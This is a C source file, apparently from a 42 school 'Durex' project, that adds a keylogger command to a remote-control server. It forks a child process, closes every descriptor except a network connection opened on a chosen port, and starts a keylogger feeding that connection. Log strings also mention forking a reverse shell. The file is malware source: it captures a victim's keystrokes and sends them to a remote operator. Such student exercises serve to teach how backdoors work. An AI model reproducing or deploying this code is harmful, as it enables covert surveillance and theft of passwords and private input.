/* ************************************************************************** */
/*                                                                            */
/*                                                        :::      ::::::::   */
/*   server_keylogger.c                                 :+:      :+:    :+:   */
/*                                                    +:+ +:+         +:+     */
/*   By: gbourgeo <gbourgeo@student.42.fr>          +#+  +:+       +#+        */
/*                                                +#+#+#+#+#+   +#+           */
/*   Created: 2019/08/05 00:06:30 by gbourgeo          #+#    #+#             */
/*   Updated: 2019/08/05 00:37:13 by gbourgeo         ###   ########.fr       */
/*                                                                            */
/* ************************************************************************** */

/* getrlimit */
#include <sys/time.h>
#include <sys/resource.h>
/* exit */
#include <stdlib.h>
/* open */
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>

#include "durex.h"

static void		keylog(int fd, t_cl *client)
{
	struct rlimit	rlim;

	serverLog(1, "[CMDS] - %d: Init Keylogger...\n", client->id);
	if (getrlimit(RLIMIT_NOFILE, &rlim) || rlim.rlim_max == RLIM_INFINITY)
		rlim.rlim_max = 4096;
	for (size_t i = 0; i < rlim.rlim_max; i++) {
		if (i != (size_t)fd)
			close(i);
	}
	if (serverInitKeylogger(fd))
		close(fd);
	exit(0);
}

void			serverKeylogger(t_cl *client, t_cmd *cmds)
{
	char		**options;
	char		*port;
	int			fd;
	pid_t		pid;

	serverLog(1, "[CMDS] - %d: Keylogger wanted.\n", client->id);
	options = mysplitwhitespaces(cmds->opt);
	port = (options && options[1]) ? options[1] : SERVER_KEYLOG_PORT;
	fd = serverConnectShell(client, port);
	mytabdel(&options);
	if (fd >= 0) {
		pid = fork();
		if (pid == 0)
			keylog(fd, client);
		else if (pid < 0) {
			serverLog(1, "[ERRO] - %d: Failed to fork a new reverse shell.\n", client->id);
			clientWrite("Fork failed.\n", client);
		}
		close(fd);
	}
	clientWrite("$> ", client);
}
